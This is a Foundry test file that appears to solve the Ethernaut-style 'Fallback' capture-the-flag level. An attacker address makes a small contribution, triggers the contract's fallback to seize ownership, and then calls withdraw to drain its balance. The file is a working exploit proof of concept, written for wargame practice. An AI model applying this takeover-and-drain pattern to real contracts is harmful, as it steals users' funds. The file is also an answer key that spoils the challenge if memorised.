// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Fallback} from "../Fallback.sol";

contract FallbackTest is Test {
    Fallback fallbackContract;

    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");

    function setUp() public {
        vm.prank(owner);
        fallbackContract = new Fallback();
    }
    function test_Challenge1_Passed() public   {
        attack();
    }

    function attack() public { 
        assertEq(fallbackContract.owner(), owner);
        console2.log("initial owner:", owner);

        vm.prank(attacker);
        vm.deal(attacker, 10_000 ether);
        fallbackContract.contribute{value: 0.0009 ether}();

        vm.prank(attacker);       
        // 1. take the ownership of the contract
        address(fallbackContract).call{value: 2_000 ether}("");
        assertEq(fallbackContract.owner(), attacker);

        // 2. drain the contract
        vm.prank(attacker);
        fallbackContract.withdraw();
        assertEq(address(fallbackContract).balance, 0);
    }
}